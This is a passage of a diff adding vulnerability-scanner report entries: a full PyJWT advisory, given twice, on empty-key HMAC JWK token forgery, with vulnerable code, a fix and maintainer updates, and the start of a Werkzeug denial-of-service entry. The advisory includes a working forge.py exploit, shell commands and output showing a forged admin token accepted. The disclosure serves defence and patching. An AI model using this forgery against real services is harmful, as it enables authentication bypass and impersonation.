+                "text": "Vulnerability GHSA-pxh4-856f-4h89\nSeverity: HIGH\nPackage: PyJWT\nFixed Version: 2.14.0\nLink: [GHSA-pxh4-856f-4h89](https://github.com/advisories/GHSA-pxh4-856f-4h89)\n### Summary\n\n`HMACAlgorithm.from_jwk` accepts a symmetric (`kty=oct`) JWK whose `k` value is\nthe empty string and returns a zero-length key without raising. When a token is\nthen verified with that key object (a `PyJWK`, or a `PyJWK` resolved by\n`PyJWKSet` / `PyJWKClient`), the HMAC verifier computes\n`HMAC(key=b\"\", signing_input)` and accepts any token an attacker forged with the\nsame empty key. The attacker needs no secret knowledge: they reproduce the digest\nlocally with an empty key and set the token's `kid` to the empty-`k` JWK.\n\nThe empty-key rejection that `HMACAlgorithm.prepare_key` performs for\nstring/bytes secrets (added in 2.13.0) was never propagated to the sibling\n`from_jwk` code path, so the JWK/JWKS verification route stays exploitable. Under\ndefault decode options this path only emits an `InsecureKeyLengthWarning`, not an\nerror, so verification still succeeds. This is the same \"empty/nil HMAC key is\naccepted by verify\" defect the JWT ecosystem is currently closing library-side:\nfast-jwt CVE-2026-44351 (CVSS 9.1) and ruby-jwt CVE-2026-45363 both added a\nlibrary-side reject-empty-HMAC-key precondition.\n\n### Affected versions\n\n`PyJWT` (PyPI package `pyjwt`) `\u003c= 2.13.0`, current `master` at commit\n`7144e4534c34810f4525dc4578a32addd8212cff`. The string/bytes secret path is\nalready guarded in 2.13.0; the JWK/JWKS path is not.\n\n### Privilege required\n\nUnauthenticated. Any party who can reach a JWT-verifying endpoint of an\napplication that verifies via a `PyJWK` / `PyJWKSet` / `PyJWKClient` whose oct\nkey has an empty `k` can forge tokens with arbitrary claims.\n\nPreconditions: the verifier resolves the HMAC key from a JWK/JWKS whose oct\nentry carries an empty `k`. This occurs when the signing secret is sourced from\nan unset environment variable / unset config row / key-finder fallback that\nbase64url-encodes `b\"\"` into the published JWKS, or when the application trusts a\nJWKS containing such an entry. The equivalent unset-secret case for the\nstring-secret API (`jwt.decode(token, key=\"\")`) is already rejected in 2.13.0;\nthe JWK route is the remaining reachable surface for the same misconfiguration.\n\n### Vulnerable code\n\n`jwt/algorithms.py`, `HMACAlgorithm.from_jwk` (line 380):\n\n```python\n@staticmethod\ndef from_jwk(jwk: str | JWKDict) -\u003e bytes:\n    try:\n        if isinstance(jwk, str):\n            obj: JWKDict = json.loads(jwk)\n        elif isinstance(jwk, dict):\n            obj = jwk\n        else:\n            raise ValueError\n    except ValueError:\n        raise InvalidKeyError(\"Key is not valid JSON\") from None\n\n    if obj.get(\"kty\") != \"oct\":\n        raise InvalidKeyError(\"Not an HMAC key\")\n\n    return base64url_decode(obj[\"k\"])   # \u003c-- empty k -\u003e b\"\", no rejection\n```\n\nContrast the sibling `prepare_key`, which DID get the guard (lines 325-329):\n\n```python\ndef prepare_key(self, key: str | bytes) -\u003e bytes:\n    key_bytes = force_bytes(key)\n\n    if len(key_bytes) == 0:\n        raise InvalidKeyError(\"HMAC key must not be empty.\")\n```\n\nIn `jwt/api_jws.py`, `_verify_signature` (lines 389-416) uses the `PyJWK` key\nmaterial directly, bypassing `prepare_key`, and the length warning is non-fatal\nby default:\n\n```python\n        if isinstance(key, PyJWK):\n            if alg != key.algorithm_name:\n                raise InvalidAlgorithmError(\n                    f\"Token algorithm {alg!r} does not match the key's \"\n                    f\"algorithm {key.algorithm_name!r}\"\n                )\n            alg_obj = key.Algorithm\n            prepared_key = key.key            # from_jwk output (b\"\"), prepare_key not run\n        else:\n            try:\n                alg_obj = self.get_algorithm_by_name(alg)\n            except NotImplementedError as e:\n                raise InvalidAlgorithmError(\"Algorithm not supported\") from e\n            prepared_key = alg_obj.prepare_key(key)\n\n        key_length_msg = alg_obj.check_key_length(prepared_key)\n        if key_length_msg:\n            if effective_options.get(\"enforce_minimum_key_length\", False):\n                raise InvalidKeyError(key_length_msg)\n            else:\n                warnings.warn(key_length_msg, InsecureKeyLengthWarning, stacklevel=4)  # default: warn only\n\n        if not alg_obj.verify(signing_input, prepared_key, signature):  # verify with b\"\" succeeds\n            raise InvalidSignatureError(\"Signature verification failed\")\n```\n\n`PyJWK.__init__` sets `self.key = self.Algorithm.from_jwk(self._jwk_data)`, so a\n`{\"kty\":\"oct\",\"k\":\"\"}` JWK yields `PyJWK.key == b\"\"`. `PyJWKSet` and\n`PyJWKClient.get_signing_key_from_jwt` build `PyJWK` objects the same way, so the\nJWKS-over-HTTP resolution route is affected identically.\n\nThe 2.13.0 release note (`CHANGELOG.rst`) documents the `prepare_key` JWK/PEM\nhardening (GHSA-xgmm-8j9v-c9wx) and the `PyJWK` alg-binding fix\n(GHSA-jq35-7prp-9v3f), and the test suite has\n`test_hmac_prepare_key_rejects_empty_key` plus\n`test_hmac_from_jwk_should_raise_exception_if_empty_json` (which tests an empty\nJSON object `{}`, not an oct key with empty `k`). The empty-`k` oct case is the\nuntested sibling path this report closes.\n\n### How the attacker input reaches the sink\n\nAn unauthenticated HTTP client controls the bearer token entirely: its `kid`\nselects the empty-`k` oct JWK, and its signature is computed locally with the\nempty key. The token flows request header -\u003e `PyJWKClient.get_signing_key_from_jwt`\n(kid resolution against the trusted JWKS) -\u003e `jwt.decode` with the resolved\n`PyJWK` -\u003e `_verify_signature` -\u003e `HMACAlgorithm.verify(signing_input, b\"\", sig)`.\nNo secret,\ncredential, or prior session is required; the only server-side precondition is a\nJWKS oct entry with an empty `k`, which the \"unset signing secret\" configuration\nproduces. This is the identical trust boundary the string-secret path already\nguards.\n\n### Proof of concept\n\n### End-to-end reproduction against pinned PyPI `pyjwt` 2.13.0 (two deployed Flask services)\n\nTwo services model a standard OIDC-style deployment: an auth service publishing a\nJWKS, and a protected resource server validating bearer tokens against that JWKS\nwith PyJWT's documented `PyJWKClient` pattern. The auth service's signing secret\nis sourced from an unset env var (`SIGNING_SECRET` unset -\u003e `\"\"`), so the\npublished oct JWK carries `k == \"\"`.\n\n`idp.py` (auth service):\n\n```python\nimport os, base64\nfrom flask import Flask, jsonify\napp = Flask(__name__)\nSIGNING_SECRET = os.environ.get(\"SIGNING_SECRET\", \"\")   # UNSET at runtime -\u003e \"\"\ndef b64u(b): return base64.urlsafe_b64encode(b).rstrip(b\"=\").decode()\n\n@app.route(\"/.well-known/jwks.json\")\ndef jwks():\n    return jsonify({\"keys\": [{\n        \"kty\": \"oct\", \"use\": \"sig\", \"alg\": \"HS256\",\n        \"kid\": \"auth-signing-2026\",\n        \"k\": b64u(SIGNING_SECRET.encode()),   # empty secret -\u003e k == \"\"\n    }]})\n\nif __name__ == \"__main__\":\n    app.run(port=9101)\n```\n\n`api.py` (protected resource server):\n\n```python\nfrom flask import Flask, request, jsonify\nimport jwt\nfrom jwt import PyJWKClient\napp = Flask(__name__)\njwks_client = PyJWKClient(\"http://127.0.0.1:9101/.well-known/jwks.json\")\n\ndef authenticate():\n    auth = request.headers.get(\"Authorization\", \"\")\n    if not auth.startswith(\"Bearer \"):\n        return None, \"missing bearer token\"\n    token = auth.split(\" \", 1)[1]\n    try:\n        signing_key = jwks_client.get_signing_key_from_jwt(token)  # resolves by kid\n        claims = jwt.decode(token, signing_key, algorithms=[\"HS256\", \"RS256\"])\n    except Exception as e:\n        return None, \"invalid token: %s\" % type(e).__name__\n    return claims, None\n\n@app.route(\"/api/admin/users\")\ndef admin_users():\n    claims, err = authenticate()\n    if err:\n        return jsonify({\"error\": err}), 401\n    if claims.get(\"role\") != \"admin\":\n        return jsonify({\"error\": \"forbidden\"}), 403\n    return jsonify({\"ok\": True, \"action\": \"list_all_users\",\n                    \"as_user\": claims.get(\"sub\"), \"role\": claims.get(\"role\")})\n\nif __name__ == \"__main__\":\n    app.run(port=9102)\n```\n\n`forge.py` (attacker; no secret knowledge):\n\n```python\nimport hmac, hashlib, base64, json, sys\ndef b64u(b): return base64.urlsafe_b64encode(b).rstrip(b\"=\").decode()\nheader={\"alg\":\"HS256\",\"typ\":\"JWT\",\"kid\":\"auth-signing-2026\"}\npayload={\"sub\":\"attacker@evil.example\",\"role\":\"admin\"}\nsi=b64u(json.dumps(header,separators=(',',':')).encode())+\".\"+b64u(json.dumps(payload,separators=(',',':')).encode())\nkey = sys.argv[1].encode() if len(sys.argv)\u003e1 else b\"\"   # empty key\nsig=hmac.new(key, si.encode(), hashlib.sha256).digest()\nprint(si+\".\"+b64u(sig))\n```\n\nRun:\n\n```bash\npython -m venv v \u0026\u0026 ./v/bin/pip install \"PyJWT==2.13.0\" flask\n( SIGNING_SECRET= ./v/bin/python idp.py \u0026 ) ; ./v/bin/python api.py \u0026\nFORGED=$(./v/bin/python forge.py \"\")\ncurl -s -H \"Authorization: Bearer $FORGED\" http://127.0.0.1:9102/api/admin/users\n```\n\nVerbatim run (attack, both negative controls, sanity, and patched-build re-run):\n\n```\n### PyJWT version\n2.13.0\n\n### JWKS published by the auth service (note the empty \"k\"):\n{\"keys\":[{\"alg\":\"HS256\",\"k\":\"\",\"kid\":\"auth-signing-2026\",\"kty\":\"oct\",\"use\":\"sig\"}]}\n\n### Baseline: unauthenticated request to admin endpoint\nHTTP 401\n\n### ATTACK: attacker forges HS256 admin token signed with the EMPTY key\nforged token: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCIsImtpZCI6ImF1dGgtc2lnbmluZy0yMDI2In0.eyJzdWIiOiJhdHRhY2tlckBldmlsLmV4YW1wbGUiLCJyb2xlIjoiYWRtaW4ifQ.iwgDP9D-oD0zXWMEUhx710f_NjHWKkrLVgjPAOtEUSQ\nresponse:\n{\"action\":\"list_all_users\",\"as_user\":\"attacker@evil.example\",\"ok\":true,\"role\":\"admin\"}\n  \u003c-- HTTP 200\n\n### NEGATIVE CONTROL 1: forge with a WRONG non-empty key (IdP still empty) -\u003e reject\n{\"error\":\"invalid token: InvalidSignatureError\"}\n  \u003c-- HTTP 401\n\n### NEGATIVE CONTROL 2: IdP restarted with a REAL non-empty secret; empty-key forgery must now fail\nJWKS now has non-empty k:\n{\"keys\":[{\"alg\":\"HS256\",\"k\":\"YS1yZWFsLTMyLWJ5dGUtc3Ryb25nLXNlY3JldC12YWx1ZS0xMjM0\",\"kid\":\"auth-signing-2026\",\"kty\":\"oct\",\"use\":\"sig\"}]}\n{\"error\":\"invalid token: InvalidSignatureError\"}\n  \u003c-- HTTP 401\n\n### Sanity: a legitimately-signed token with the real secret is accepted\n{\"action\":\"list_all_users\",\"as_user\":\"attacker@evil.example\",\"ok\":true,\"role\":\"admin\"}\n  \u003c-- HTTP 200\n\n### PATCHED BUILD (from_jwk rejects empty k): re-run the empty-key forgery -\u003e now rejected\nJWKS (empty k, vulnerable config):\n{\"keys\":[{\"alg\":\"HS256\",\"k\":\"\",\"kid\":\"auth-signing-2026\",\"kty\":\"oct\",\"use\":\"sig\"}]}\n{\"error\":\"invalid token: PyJWKSetError\"}\n  \u003c-- HTTP 401\n```\n\nThe attack returns HTTP 200 with `role:admin` from an unauthenticated forged\ntoken. Both negative controls (wrong non-empty key; real non-empty secret at the\nauth service) return 401, isolating the defect to empty-key acceptance. The\npatched build (the `from_jwk` fix below) rejects the forgery.\n\n### Impact\n\n- Unauthenticated authentication bypass / token forgery: an attacker mints tokens\n  with arbitrary claims (`role:admin`, arbitrary `sub`) that verify successfully,\n  yielding full impersonation and privilege escalation on any endpoint gated by\n  such tokens.\n- Reachable through the documented JWKS verification API\n  (`PyJWKClient` / `PyJWKSet` / `PyJWK`), not just direct `HMACAlgorithm` use.\n- Triggered by the common \"unset signing secret\" misconfiguration that the\n  string-secret path already rejects in 2.13.0, leaving the JWK path as an\n  asymmetric gap.\n\n### Suggested fix\n\nReject a zero-length key in `HMACAlgorithm.from_jwk`, mirroring the guard that\n`prepare_key` already applies:\n\n```python\nif obj.get(\"kty\") != \"oct\":\n    raise InvalidKeyError(\"Not an HMAC key\")\n\nkey_bytes = base64url_decode(obj[\"k\"])\nif len(key_bytes) == 0:\n    raise InvalidKeyError(\"HMAC key must not be empty.\")\nreturn key_bytes\n```\n\nThis reuses the exact error message and length check the string/bytes path uses,\nso both HMAC key-loading routes enforce the same invariant. A regression test for\nthe empty-`k` oct JWK belongs next to `test_hmac_from_jwk_should_raise_exception_if_empty_json`.\n\n### Fix PR\n\nhttps://github.com/jpadilla/pyjwt-ghsa-pxh4-856f-4h89/pull/1 (private advisory\ntemp fork, base `master`, branch `fix/hmac-from-jwk-reject-empty-key`,\nDCO-signed; adds `test_hmac_from_jwk_rejects_empty_k`; `test_algorithms.py`,\n`test_api_jwk.py`, `test_api_jws.py` pass).\n\n### Credit\n\nReported by tonghuaroot.\n\n\u003e Maintainer update (2026-09-10): We reproduced the reported behavior: an `oct` JWK with an empty `k` value was decoded to an empty HMAC key and accepted through the JWK/PyJWK verification path, while the raw string/bytes path correctly rejected an empty key. The fix adds the same empty-key validation at the JWK boundary and includes a regression test. It is committed as `af8181ca0bec5e6b372fbba9afbe23702b787ceb` and has passed the available project tox environments, including crypto and non-crypto tests on Python 3.9, 3.12, and 3.13, plus mypy, package metadata, and coverage checks. Fresh Astra/max review accepted the fix and confirmed that nonempty, binary, and asymmetric-key behavior remains unchanged. The fix has not yet shipped in a released PyJWT version, so this advisory is being moved to draft and remains unpublished pending release.\n\n## Maintainer update — 2026-09-11\n\nThe verified fix for this advisory is included in PyJWT 2.14.0, released on 2026-09-11 and available on PyPI. PyJWT 2.14.0 is the first release containing the fix. This advisory is now published with 2.14.0 recorded as the patched version.",
+                "markdown": "**Vulnerability GHSA-pxh4-856f-4h89**\n| Severity | Package | Fixed Version | Link |\n| --- | --- | --- | --- |\n|HIGH|PyJWT|2.14.0|[GHSA-pxh4-856f-4h89](https://github.com/advisories/GHSA-pxh4-856f-4h89)|\n\n### Summary\n\n`HMACAlgorithm.from_jwk` accepts a symmetric (`kty=oct`) JWK whose `k` value is\nthe empty string and returns a zero-length key without raising. When a token is\nthen verified with that key object (a `PyJWK`, or a `PyJWK` resolved by\n`PyJWKSet` / `PyJWKClient`), the HMAC verifier computes\n`HMAC(key=b\"\", signing_input)` and accepts any token an attacker forged with the\nsame empty key. The attacker needs no secret knowledge: they reproduce the digest\nlocally with an empty key and set the token's `kid` to the empty-`k` JWK.\n\nThe empty-key rejection that `HMACAlgorithm.prepare_key` performs for\nstring/bytes secrets (added in 2.13.0) was never propagated to the sibling\n`from_jwk` code path, so the JWK/JWKS verification route stays exploitable. Under\ndefault decode options this path only emits an `InsecureKeyLengthWarning`, not an\nerror, so verification still succeeds. This is the same \"empty/nil HMAC key is\naccepted by verify\" defect the JWT ecosystem is currently closing library-side:\nfast-jwt CVE-2026-44351 (CVSS 9.1) and ruby-jwt CVE-2026-45363 both added a\nlibrary-side reject-empty-HMAC-key precondition.\n\n### Affected versions\n\n`PyJWT` (PyPI package `pyjwt`) `\u003c= 2.13.0`, current `master` at commit\n`7144e4534c34810f4525dc4578a32addd8212cff`. The string/bytes secret path is\nalready guarded in 2.13.0; the JWK/JWKS path is not.\n\n### Privilege required\n\nUnauthenticated. Any party who can reach a JWT-verifying endpoint of an\napplication that verifies via a `PyJWK` / `PyJWKSet` / `PyJWKClient` whose oct\nkey has an empty `k` can forge tokens with arbitrary claims.\n\nPreconditions: the verifier resolves the HMAC key from a JWK/JWKS whose oct\nentry carries an empty `k`. This occurs when the signing secret is sourced from\nan unset environment variable / unset config row / key-finder fallback that\nbase64url-encodes `b\"\"` into the published JWKS, or when the application trusts a\nJWKS containing such an entry. The equivalent unset-secret case for the\nstring-secret API (`jwt.decode(token, key=\"\")`) is already rejected in 2.13.0;\nthe JWK route is the remaining reachable surface for the same misconfiguration.\n\n### Vulnerable code\n\n`jwt/algorithms.py`, `HMACAlgorithm.from_jwk` (line 380):\n\n```python\n@staticmethod\ndef from_jwk(jwk: str | JWKDict) -\u003e bytes:\n    try:\n        if isinstance(jwk, str):\n            obj: JWKDict = json.loads(jwk)\n        elif isinstance(jwk, dict):\n            obj = jwk\n        else:\n            raise ValueError\n    except ValueError:\n        raise InvalidKeyError(\"Key is not valid JSON\") from None\n\n    if obj.get(\"kty\") != \"oct\":\n        raise InvalidKeyError(\"Not an HMAC key\")\n\n    return base64url_decode(obj[\"k\"])   # \u003c-- empty k -\u003e b\"\", no rejection\n```\n\nContrast the sibling `prepare_key`, which DID get the guard (lines 325-329):\n\n```python\ndef prepare_key(self, key: str | bytes) -\u003e bytes:\n    key_bytes = force_bytes(key)\n\n    if len(key_bytes) == 0:\n        raise InvalidKeyError(\"HMAC key must not be empty.\")\n```\n\nIn `jwt/api_jws.py`, `_verify_signature` (lines 389-416) uses the `PyJWK` key\nmaterial directly, bypassing `prepare_key`, and the length warning is non-fatal\nby default:\n\n```python\n        if isinstance(key, PyJWK):\n            if alg != key.algorithm_name:\n                raise InvalidAlgorithmError(\n                    f\"Token algorithm {alg!r} does not match the key's \"\n                    f\"algorithm {key.algorithm_name!r}\"\n                )\n            alg_obj = key.Algorithm\n            prepared_key = key.key            # from_jwk output (b\"\"), prepare_key not run\n        else:\n            try:\n                alg_obj = self.get_algorithm_by_name(alg)\n            except NotImplementedError as e:\n                raise InvalidAlgorithmError(\"Algorithm not supported\") from e\n            prepared_key = alg_obj.prepare_key(key)\n\n        key_length_msg = alg_obj.check_key_length(prepared_key)\n        if key_length_msg:\n            if effective_options.get(\"enforce_minimum_key_length\", False):\n                raise InvalidKeyError(key_length_msg)\n            else:\n                warnings.warn(key_length_msg, InsecureKeyLengthWarning, stacklevel=4)  # default: warn only\n\n        if not alg_obj.verify(signing_input, prepared_key, signature):  # verify with b\"\" succeeds\n            raise InvalidSignatureError(\"Signature verification failed\")\n```\n\n`PyJWK.__init__` sets `self.key = self.Algorithm.from_jwk(self._jwk_data)`, so a\n`{\"kty\":\"oct\",\"k\":\"\"}` JWK yields `PyJWK.key == b\"\"`. `PyJWKSet` and\n`PyJWKClient.get_signing_key_from_jwt` build `PyJWK` objects the same way, so the\nJWKS-over-HTTP resolution route is affected identically.\n\nThe 2.13.0 release note (`CHANGELOG.rst`) documents the `prepare_key` JWK/PEM\nhardening (GHSA-xgmm-8j9v-c9wx) and the `PyJWK` alg-binding fix\n(GHSA-jq35-7prp-9v3f), and the test suite has\n`test_hmac_prepare_key_rejects_empty_key` plus\n`test_hmac_from_jwk_should_raise_exception_if_empty_json` (which tests an empty\nJSON object `{}`, not an oct key with empty `k`). The empty-`k` oct case is the\nuntested sibling path this report closes.\n\n### How the attacker input reaches the sink\n\nAn unauthenticated HTTP client controls the bearer token entirely: its `kid`\nselects the empty-`k` oct JWK, and its signature is computed locally with the\nempty key. The token flows request header -\u003e `PyJWKClient.get_signing_key_from_jwt`\n(kid resolution against the trusted JWKS) -\u003e `jwt.decode` with the resolved\n`PyJWK` -\u003e `_verify_signature` -\u003e `HMACAlgorithm.verify(signing_input, b\"\", sig)`.\nNo secret,\ncredential, or prior session is required; the only server-side precondition is a\nJWKS oct entry with an empty `k`, which the \"unset signing secret\" configuration\nproduces. This is the identical trust boundary the string-secret path already\nguards.\n\n### Proof of concept\n\n### End-to-end reproduction against pinned PyPI `pyjwt` 2.13.0 (two deployed Flask services)\n\nTwo services model a standard OIDC-style deployment: an auth service publishing a\nJWKS, and a protected resource server validating bearer tokens against that JWKS\nwith PyJWT's documented `PyJWKClient` pattern. The auth service's signing secret\nis sourced from an unset env var (`SIGNING_SECRET` unset -\u003e `\"\"`), so the\npublished oct JWK carries `k == \"\"`.\n\n`idp.py` (auth service):\n\n```python\nimport os, base64\nfrom flask import Flask, jsonify\napp = Flask(__name__)\nSIGNING_SECRET = os.environ.get(\"SIGNING_SECRET\", \"\")   # UNSET at runtime -\u003e \"\"\ndef b64u(b): return base64.urlsafe_b64encode(b).rstrip(b\"=\").decode()\n\n@app.route(\"/.well-known/jwks.json\")\ndef jwks():\n    return jsonify({\"keys\": [{\n        \"kty\": \"oct\", \"use\": \"sig\", \"alg\": \"HS256\",\n        \"kid\": \"auth-signing-2026\",\n        \"k\": b64u(SIGNING_SECRET.encode()),   # empty secret -\u003e k == \"\"\n    }]})\n\nif __name__ == \"__main__\":\n    app.run(port=9101)\n```\n\n`api.py` (protected resource server):\n\n```python\nfrom flask import Flask, request, jsonify\nimport jwt\nfrom jwt import PyJWKClient\napp = Flask(__name__)\njwks_client = PyJWKClient(\"http://127.0.0.1:9101/.well-known/jwks.json\")\n\ndef authenticate():\n    auth = request.headers.get(\"Authorization\", \"\")\n    if not auth.startswith(\"Bearer \"):\n        return None, \"missing bearer token\"\n    token = auth.split(\" \", 1)[1]\n    try:\n        signing_key = jwks_client.get_signing_key_from_jwt(token)  # resolves by kid\n        claims = jwt.decode(token, signing_key, algorithms=[\"HS256\", \"RS256\"])\n    except Exception as e:\n        return None, \"invalid token: %s\" % type(e).__name__\n    return claims, None\n\n@app.route(\"/api/admin/users\")\ndef admin_users():\n    claims, err = authenticate()\n    if err:\n        return jsonify({\"error\": err}), 401\n    if claims.get(\"role\") != \"admin\":\n        return jsonify({\"error\": \"forbidden\"}), 403\n    return jsonify({\"ok\": True, \"action\": \"list_all_users\",\n                    \"as_user\": claims.get(\"sub\"), \"role\": claims.get(\"role\")})\n\nif __name__ == \"__main__\":\n    app.run(port=9102)\n```\n\n`forge.py` (attacker; no secret knowledge):\n\n```python\nimport hmac, hashlib, base64, json, sys\ndef b64u(b): return base64.urlsafe_b64encode(b).rstrip(b\"=\").decode()\nheader={\"alg\":\"HS256\",\"typ\":\"JWT\",\"kid\":\"auth-signing-2026\"}\npayload={\"sub\":\"attacker@evil.example\",\"role\":\"admin\"}\nsi=b64u(json.dumps(header,separators=(',',':')).encode())+\".\"+b64u(json.dumps(payload,separators=(',',':')).encode())\nkey = sys.argv[1].encode() if len(sys.argv)\u003e1 else b\"\"   # empty key\nsig=hmac.new(key, si.encode(), hashlib.sha256).digest()\nprint(si+\".\"+b64u(sig))\n```\n\nRun:\n\n```bash\npython -m venv v \u0026\u0026 ./v/bin/pip install \"PyJWT==2.13.0\" flask\n( SIGNING_SECRET= ./v/bin/python idp.py \u0026 ) ; ./v/bin/python api.py \u0026\nFORGED=$(./v/bin/python forge.py \"\")\ncurl -s -H \"Authorization: Bearer $FORGED\" http://127.0.0.1:9102/api/admin/users\n```\n\nVerbatim run (attack, both negative controls, sanity, and patched-build re-run):\n\n```\n### PyJWT version\n2.13.0\n\n### JWKS published by the auth service (note the empty \"k\"):\n{\"keys\":[{\"alg\":\"HS256\",\"k\":\"\",\"kid\":\"auth-signing-2026\",\"kty\":\"oct\",\"use\":\"sig\"}]}\n\n### Baseline: unauthenticated request to admin endpoint\nHTTP 401\n\n### ATTACK: attacker forges HS256 admin token signed with the EMPTY key\nforged token: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCIsImtpZCI6ImF1dGgtc2lnbmluZy0yMDI2In0.eyJzdWIiOiJhdHRhY2tlckBldmlsLmV4YW1wbGUiLCJyb2xlIjoiYWRtaW4ifQ.iwgDP9D-oD0zXWMEUhx710f_NjHWKkrLVgjPAOtEUSQ\nresponse:\n{\"action\":\"list_all_users\",\"as_user\":\"attacker@evil.example\",\"ok\":true,\"role\":\"admin\"}\n  \u003c-- HTTP 200\n\n### NEGATIVE CONTROL 1: forge with a WRONG non-empty key (IdP still empty) -\u003e reject\n{\"error\":\"invalid token: InvalidSignatureError\"}\n  \u003c-- HTTP 401\n\n### NEGATIVE CONTROL 2: IdP restarted with a REAL non-empty secret; empty-key forgery must now fail\nJWKS now has non-empty k:\n{\"keys\":[{\"alg\":\"HS256\",\"k\":\"YS1yZWFsLTMyLWJ5dGUtc3Ryb25nLXNlY3JldC12YWx1ZS0xMjM0\",\"kid\":\"auth-signing-2026\",\"kty\":\"oct\",\"use\":\"sig\"}]}\n{\"error\":\"invalid token: InvalidSignatureError\"}\n  \u003c-- HTTP 401\n\n### Sanity: a legitimately-signed token with the real secret is accepted\n{\"action\":\"list_all_users\",\"as_user\":\"attacker@evil.example\",\"ok\":true,\"role\":\"admin\"}\n  \u003c-- HTTP 200\n\n### PATCHED BUILD (from_jwk rejects empty k): re-run the empty-key forgery -\u003e now rejected\nJWKS (empty k, vulnerable config):\n{\"keys\":[{\"alg\":\"HS256\",\"k\":\"\",\"kid\":\"auth-signing-2026\",\"kty\":\"oct\",\"use\":\"sig\"}]}\n{\"error\":\"invalid token: PyJWKSetError\"}\n  \u003c-- HTTP 401\n```\n\nThe attack returns HTTP 200 with `role:admin` from an unauthenticated forged\ntoken. Both negative controls (wrong non-empty key; real non-empty secret at the\nauth service) return 401, isolating the defect to empty-key acceptance. The\npatched build (the `from_jwk` fix below) rejects the forgery.\n\n### Impact\n\n- Unauthenticated authentication bypass / token forgery: an attacker mints tokens\n  with arbitrary claims (`role:admin`, arbitrary `sub`) that verify successfully,\n  yielding full impersonation and privilege escalation on any endpoint gated by\n  such tokens.\n- Reachable through the documented JWKS verification API\n  (`PyJWKClient` / `PyJWKSet` / `PyJWK`), not just direct `HMACAlgorithm` use.\n- Triggered by the common \"unset signing secret\" misconfiguration that the\n  string-secret path already rejects in 2.13.0, leaving the JWK path as an\n  asymmetric gap.\n\n### Suggested fix\n\nReject a zero-length key in `HMACAlgorithm.from_jwk`, mirroring the guard that\n`prepare_key` already applies:\n\n```python\nif obj.get(\"kty\") != \"oct\":\n    raise InvalidKeyError(\"Not an HMAC key\")\n\nkey_bytes = base64url_decode(obj[\"k\"])\nif len(key_bytes) == 0:\n    raise InvalidKeyError(\"HMAC key must not be empty.\")\nreturn key_bytes\n```\n\nThis reuses the exact error message and length check the string/bytes path uses,\nso both HMAC key-loading routes enforce the same invariant. A regression test for\nthe empty-`k` oct JWK belongs next to `test_hmac_from_jwk_should_raise_exception_if_empty_json`.\n\n### Fix PR\n\nhttps://github.com/jpadilla/pyjwt-ghsa-pxh4-856f-4h89/pull/1 (private advisory\ntemp fork, base `master`, branch `fix/hmac-from-jwk-reject-empty-key`,\nDCO-signed; adds `test_hmac_from_jwk_rejects_empty_k`; `test_algorithms.py`,\n`test_api_jwk.py`, `test_api_jws.py` pass).\n\n### Credit\n\nReported by tonghuaroot.\n\n\u003e Maintainer update (2026-09-10): We reproduced the reported behavior: an `oct` JWK with an empty `k` value was decoded to an empty HMAC key and accepted through the JWK/PyJWK verification path, while the raw string/bytes path correctly rejected an empty key. The fix adds the same empty-key validation at the JWK boundary and includes a regression test. It is committed as `af8181ca0bec5e6b372fbba9afbe23702b787ceb` and has passed the available project tox environments, including crypto and non-crypto tests on Python 3.9, 3.12, and 3.13, plus mypy, package metadata, and coverage checks. Fresh Astra/max review accepted the fix and confirmed that nonempty, binary, and asymmetric-key behavior remains unchanged. The fix has not yet shipped in a released PyJWT version, so this advisory is being moved to draft and remains unpublished pending release.\n\n## Maintainer update — 2026-09-11\n\nThe verified fix for this advisory is included in PyJWT 2.14.0, released on 2026-09-11 and available on PyPI. PyJWT 2.14.0 is the first release containing the fix. This advisory is now published with 2.14.0 recorded as the patched version."
+              },
+              "properties": {
+                "cvssv3_baseScore": 7.4,
+                "cvssv3_vector": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:H/A:N",
+                "precision": "very-high",
+                "security-severity": "7.4",
+                "tags": [
+                  "vulnerability",
+                  "security",
+                  "HIGH"
+                ]
+              }
+            },
+            {
+              "id": "CVE-2023-25577",
+              "name": "LanguageSpecificPackageVulnerability",
+              "shortDescription": {
+                "text": "python-werkzeug: high resource usage when parsing multipart form data with many fields"
+              },
+              "fullDescription": {
+                "text": "Werkzeug is a comprehensive WSGI web application library. Prior to version 2.2.3, Werkzeug's multipart form data parser will parse an unlimited number of parts, including file parts. Parts can be a small amount of bytes, but each requires CPU time to parse and may use more memory as Python data. If a request can be made to an endpoint that accesses `request.data`, `request.form`, `request.files`, or `request.get_data(parse_form_data=False)`, it can cause unexpectedly high resource usage. This allows an attacker to cause a denial of service by sending crafted multipart data to an endpoint that will parse it. The amount of CPU time required can block worker processes from handling legitimate requests. The amount of RAM required can trigger an out of memory kill of the process. Unlimited file parts can use up memory and file handles. If many concurrent requests are sent continuously, this can exhaust or kill all available workers. Version 2.2.3 contains a patch for this issue."
+              },
+              "defaultConfiguration": {
+                "level": "error"
+              },
+              "helpUri": "https://avd.aquasec.com/nvd/cve-2023-25577",
+              "help": {
+                "text": "Vulnerability CVE-2023-25577\nSeverity: HIGH\nPackage: Werkzeug\nFixed Version: 2.2.3\nLink: [CVE-2023-25577](https://avd.aquasec.com/nvd/cve-2023-25577)\nWerkzeug is a comprehensive WSGI web application library. Prior to version 2.2.3, Werkzeug's multipart form data parser will parse an unlimited number of parts, including file parts. Parts can be a small amount of bytes, but each requires CPU time to parse and may use more memory as Python data. If a request can be made to an endpoint that accesses `request.data`, `request.form`, `request.files`, or `request.get_data(parse_form_data=False)`, it can cause unexpectedly high resource usage. This allows an attacker to cause a denial of service by sending crafted multipart data to an endpoint that will parse it. The amount of CPU time required can block worker processes from handling legitimate requests. The amount of RAM required can trigger an out of memory kill of the process. Unlimited file parts can use up memory and file handles. If many concurrent requests are sent continuously, this can exhaust or kill all available workers. Version 2.2.3 contains a patch for this issue.",
